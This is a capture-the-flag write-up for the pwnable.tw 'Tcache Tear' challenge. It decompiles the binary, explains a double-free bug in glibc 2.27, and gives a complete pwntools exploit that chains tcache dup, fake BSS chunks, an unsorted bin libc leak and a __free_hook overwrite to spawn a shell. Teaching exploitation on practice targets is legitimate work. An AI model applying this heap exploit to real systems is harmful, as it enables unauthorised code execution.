@@ -1,0 +1,443 @@
+---
+title: Pwnable.tw - Tcache Tear
+date: '2024-07-18'
+tags:
+  [
+    'pwnable.tw',
+    'heap',
+    'tcache',
+    'tcache-dup',
+    'double-free',
+    'unsorted-bin-attack',
+    'fake-chunk',
+    'free-hook-overwrite',
+  ]
+draft: false
+summary: Utilizing double free to create a fake chunk in the BSS section of the ELF and freeing the chunk into the unsorted bin by using Unsorted Bin Attack to leak libc and overwrite __free_hook.
+---
+
+## Description
+
+![alt text](/static/writeups/pwnable.tw/image.png)
+
+## Solution
+
+In this challenge, we're given a stripped x64 binary. Along with that, we're given a libc; so using `pwninit` to link the libc to the binary. Checking the mitigations on the binary:
+
+![alt text](/static/writeups/pwnable.tw/image-1.png)
+
+> PIE is disabled.
+
+Now, let's firstly run this binary and see what's going on:
+
+![alt text](/static/writeups/pwnable.tw/image-2.png)
+
+The binary firstly asks for a simple name and we're presented with a menu (which is pretty common in all of the heap challenges.)
+
+---
+
+## Disassembly
+
+> Since the binary was stripped, in ghidra, I renamed the variables to make sense of each of them. The main function is as follows:
+
+```c:main
+void main(void)
+
+{
+  long input;
+  uint idx;
+
+  init();
+  printf("Name:");
+  get_str_input(&NAME_BUFFER,0x20);
+  idx = 0;
+  do {
+    while( true ) {
+      while( true ) {
+        menu();
+        input = get_input();
+        if (input != 2) break;
+        if (idx < 8) {
+          free(GLOBAL_BUFFER);
+          idx = idx + 1;
+        }
+      }
+      if (2 < input) break;
+      if (input == 1) {
+        allocate_buffer();
+      }
+      else {
+LAB_00400c75:
+        puts("Invalid choice");
+      }
+    }
+    if (input != 3) {
+      if (input == 4) {
+                    /* WARNING: Subroutine does not return */
+        exit(0);
+      }
+      goto LAB_00400c75;
+    }
+    info();
+  } while( true );
+}
+```
+
+Now, let's see the `allocate_buffer` function:
+
+```c:allocate_buffer
+void allocate_buffer(void)
+
+{
+  ulong __size;
+
+  printf("Size:");
+  __size = get_input();
+  if (__size < 0x100) {
+    GLOBAL_BUFFER = malloc(__size);
+    printf("Data:");
+    get_str_input(GLOBAL_BUFFER,(int)__size + -0x10);
+    puts("Done !");
+  }
+  return;
+}
+```
+
+In this function, we're simply asked for the size and the data we want to put. Whereas in main, when we select `2`, we simply `free` the buffer, and when we press `3`, we go into the `info` function:
+
+```c:info
+void info(void)
+
+{
+  printf("Name :");
+  write(1,&NAME_BUFFER,0x20);
+  return;
+}
+```
+
+Here, the program simply prints the Name buffer, which gives us a read primitive.
+
+---
+
+## Exploitation
+
+The bug lies in the program when we free a chunk. It doesn't check if we've already freed a chunk which can lead to a Double Free Bug, which can grant us an arbitrary write.
+
+> This is possible because we're pwning this against libc 2.27. This sort of Double Free was fixed in libc >= 2.33.
+
+We'll use this double free bug to perform an Unsorted Bin attack to leak libc and then overwrite `__free_hook` with one gadget.
+
+## Unsorted Bin Attack
+
+The unsorted bin attack is an attack technique that allows the address of the `main_arena` area to be written to an arbitrary address when the `BK pointer` of the freed chunk can be manipulated. Now, in our scenario, we'll use the Unsorted Bin Attack to leak the address of libc's main arena.
+
+In order to perform this attack, we'll chain together the double free bug that we already identified.
+
+To make it work, we'll firstly create a fake chunk near the `NAME` field. Since that field is in bss section. We can easily write data to it, and utilizing it with our double free to perform an Arbitrary Address Write (AAW).
+
+So, the exploit for us will be as follows:
+
+```py:exploit.py
+#!/usr/bin/env python3
+
+from pwn import *
+context.terminal = ["tmux", "splitw", "-h"]
+
+encode = lambda e: e if type(e) == bytes else str(e).encode()
+hexleak = lambda l: int(l[:-1] if l[-1] == '\n' else l, 16)
+fixleak = lambda l: unpack(l.ljust(8, b"\x00"))
+
+exe = "./tcache_tear_patched"
+elf = context.binary = ELF(exe)
+libc = elf.libc
+io = remote(sys.argv[1], int(sys.argv[2])
+    ) if args.REMOTE else process(argv=[exe], aslr=False)
+if args.GDB: gdb.attach(io, """
+    b *main
+""")
+
+DEBUG = True
+
+def menu(idx):
+    io.sendlineafter(b":", encode(idx))
+
+def malloc(sz, data):
+    if DEBUG: info("Allocating chunk of size %d" % sz)
+    menu(1)
+    io.sendlineafter(b"Size:", encode(sz))
+    io.sendlineafter(b"Data:", encode(data))
+
+def free():
+    menu(2)
+
+def get_info():
+    menu(3)
+    io.recvuntil(b"Name :")
+    return io.recvuntil(b"$")[:-1]
+
+NAME_BUF = 0x602060
+
+# Set name:
+menu("theflash2k")
+```
+
+Now, the next thing we need to do is to create a fake chunk, and set the `BK` of that chunk to be `address+0x10`. So that once that chunk will be freed, the address stored at `BK`, `-0x10`, will contain the libc's main arena's address.
+
+To perform this, we must choose the size of the buffer to be allocated to be in the range of unsorted bin rather than tcache. We can simply choose a large number. Since we also need to set the `PREV_INUSE` bit, we can `OR` it by 1. For our chunk, the layout will be as follows:
+
+```table
+| ------------- | ---- SIZE ----- |
+| ------------ DATA ------------- |
+| ---- FD ----- | ----- BK ------ |
+```
+
+Now, we know that we need to write the arbitrary address at `BK`, we can generate a simple fake chunk as follows:
+
+```py
+fake_chunk = flat(
+    0x0,
+    0x420 | 1,
+    0x0, 0x0, 0x0,
+    NAME_BUF + 0x10 # +0x10 so that the FD and BK pointers are written to this address
+)
+```
+
+Along with the double free bug, we'll chain this and the payload will be as follows:
+
+```py
+malloc(0x60, b"CCCC")
+free()
+free()
+malloc(0x60, p64(NAME_BUF))
+malloc(0x60, "BBBB")
+malloc(0x60, fake_chunk)
+free()
+```
+
+However, upon running this, we're greeted with the following message:
+
+![alt text](/static/writeups/pwnable.tw/image-3.png)
+
+Upon debugging it in gdb and following the `backtrace`, we see:
+
+![alt text](/static/writeups/pwnable.tw/image-4.png)
+
+In `malloc.c` on line `4281`; using [Elixir](https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L4281):
+
+```c:malloc.c
+nextchunk = chunk_at_offset(p, size);
+...
+if (__glibc_unlikely (!prev_inuse(nextchunk)))
+    malloc_printerr ("double free or corruption (!prev)");
+```
+
+Now, we can see that in glibc 2.27, there's a mitigation, that checks if the `prev_inuse` bit of the next chunk is not set, we cannot free the corresponding chunk because this chunk might be corrupted due to a double free bug.
+
+The bypass; is fairly simple. Before allocating our fake chunk, we'll generate a fake chunk at `NAME_BUF + 0x420`. What this will allow us to do is to bypass this check. Because, when malloc will check for the next chunk, we'll have already created a fake chunk at `NAME_BUF + 0x420`, whose `PREV_INUSE` bit will be set to 1.
+
+What we'll do, use a different tcache bin, perform a tcache-dup/double free, write the fake chunk. Then after that, we'll use our previous attack to perform unsorted bin attack and leak libc value.
+
+Now, the layout for this fake chunk will be as follows:
+
+```table
+| ------------- | ---- SIZE ----- |
+| ------------ DATA ------------- |
+| ---- DATA --- | ---- SIZE ----- |
+```
+
+Now, the fake chunk for this will be as follows:
+
+```py
+fake_chunk = flat(
+    0x0,
+    0x20 | 1,
+    0x0, 0x0, 0x0,
+    0x420 | 1
+)
+```
+
+The reason we're using `0x20` as the size of our small chunk is because it's the smallest chunk that we can allocate using malloc. After the `0x18` size of writable chunk, we can create another fake size field, but this time, the size would be that of the chunk we're already trying to allocate.
+
+The updated exploit with both of these attacks:
+
+```py:exploit.py
+"""
+Bypassing GLIBC Mitigation
+"""
+malloc(0x50, b"AAAA")
+free()
+free()
+
+fake_chunk = flat(
+    0x0,
+    0x20 | 1,
+    0x0, 0x0, 0x0,
+    0x420 | 1
+)
+malloc(0x50, p64(NAME_BUF + 0x420))
+malloc(0x50, "BBBB")
+malloc(0x50, fake_chunk)
+
+
+"""
+Performing Unsorted Bin Attack
+"""
+malloc(0x60, b"CCCC")
+free()
+free()
+
+fake_chunk = flat(
+    0x0,
+    0x420 | 1,
+    0x0, 0x0, 0x0,
+    NAME_BUF + 0x10
+)
+
+malloc(0x60, p64(NAME_BUF))
+malloc(0x60, "BBBB")
+malloc(0x60, fake_chunk)
+```
+
+Now, looking at the `NAME_BUF` address in gdb:
+
+![alt text](/static/writeups/pwnable.tw/image-5.png)
+
+We can see that the `BK` pointer now points to `0x602070`. Now, let's free this chunk and then analyze the memory again:
+
+![alt text](/static/writeups/pwnable.tw/image-6.png)
+
+We can see that now, the unsorted bin contains our `NAME_BUF` and also, the `FD` and `BK` pointers now point to the libc's `main_arena`. Now, if we see the info, we'll see that we get a libc leak:
+
+![alt text](/static/writeups/pwnable.tw/image-7.png)
+
+We can easily parse this leak and get a leak to libc by calculating the offsets.
+
+```py
+leak = get_info()[:-10][-6:]
+print(leak)
+leak = fixleak(leak)
+info("libc leak @ %#x" % leak)
+
+libc.address = leak - 0x3ebca0
+info("libc @ %#x" % libc.address)
+```
+
+## Free Hook Overwrite
+
+This portion is fairly simple as we already have our AAW. What we need to do here, is select the next tcache bin, perform a tcache dup to get `__free_hook` into our bin and then overwrite the `__free_hook` with one gadget. The exploit for that is as follows:
+
+```py
+malloc(0x90, "AAAA")
+free()
+free()
+
+malloc(0x90, p64(libc.sym.__free_hook))
+malloc(0x90, "BBBB")
+malloc(0x90, p64(libc.address + 0x4f322))
+```
+
+After cleaning up the code to make it more readable, the final exploit is as follows:
+
+```py:exploit.py
+#!/usr/bin/env python3
+
+from pwn import *
+context.terminal = ["tmux", "splitw", "-h"]
+
+encode = lambda e: e if type(e) == bytes else str(e).encode()
+hexleak = lambda l: int(l[:-1] if l[-1] == '\n' else l, 16)
+fixleak = lambda l: unpack(l.ljust(8, b"\x00"))
+
+exe = "./tcache_tear_patched"
+elf = context.binary = ELF(exe)
+libc = elf.libc
+io = remote(sys.argv[1], int(sys.argv[2])
+    ) if args.REMOTE else process(argv=[exe], aslr=False)
+if args.GDB: gdb.attach(io, """
+    b *main
+""")
+
+DEBUG = True
+
+def menu(idx):
+    io.sendlineafter(b":", encode(idx))
+
+def malloc(sz, data):
+    if DEBUG: info("Allocating chunk of size %#x" % sz)
+    menu(1)
+    io.sendlineafter(b"Size:", encode(sz))
+    io.sendlineafter(b"Data:", encode(data))
+
+def free():
+    menu(2)
+
+def get_info():
+    menu(3)
+    io.recvuntil(b"Name :")
+    return io.recvuntil(b"$")[:-1]
+
+NAME_BUF = 0x602060
+
+# Set name:
+menu("theflash2k")
+
+def tcache_dup(sz, addr, data):
+    malloc(sz, "A"*8)
+    free()
+    free()
+    malloc(sz, p64(addr))
+    malloc(sz, "B"*8)
+    malloc(sz, data)
+
+
+"""
+Bypassing GLIBC Mitigation
+"""
+fake_chunk = flat(
+    0x0,
+    0x20 | 1,
+    0x0, 0x0, 0x0,
+    0x420 | 1
+)
+tcache_dup(0x50, NAME_BUF + 0x420, fake_chunk)
+
+
+"""
+Performing Unsorted Bin Attack
+"""
+fake_chunk = flat(
+    0x0,
+    0x420 | 1,
+    0x0, 0x0, 0x0,
+    NAME_BUF + 0x10
+)
+tcache_dup(0x60, NAME_BUF, fake_chunk)
+
+"""
+Free the chunk into unsorted bin.
+"""
+free()
+
+"""
+When we view the info, we'll see both FD and BK pointers will give us leaks to LIBC:
+"""
+leak = fixleak(get_info()[:-10][-6:])
+info("libc leak @ %#x" % leak)
+
+libc.address = leak - 0x3ebca0
+info("libc @ %#x" % libc.address)
+
+"""
+Now, using the double free again to overwrite __free_hook with one gadget
+"""
+tcache_dup(0x90, libc.sym.__free_hook, p64(libc.address + 0x4f322))
+
+"""
+Get Shell
+"""
+free()
+
+io.interactive()
+```
+
+![alt text](/static/writeups/pwnable.tw/image-8.png)
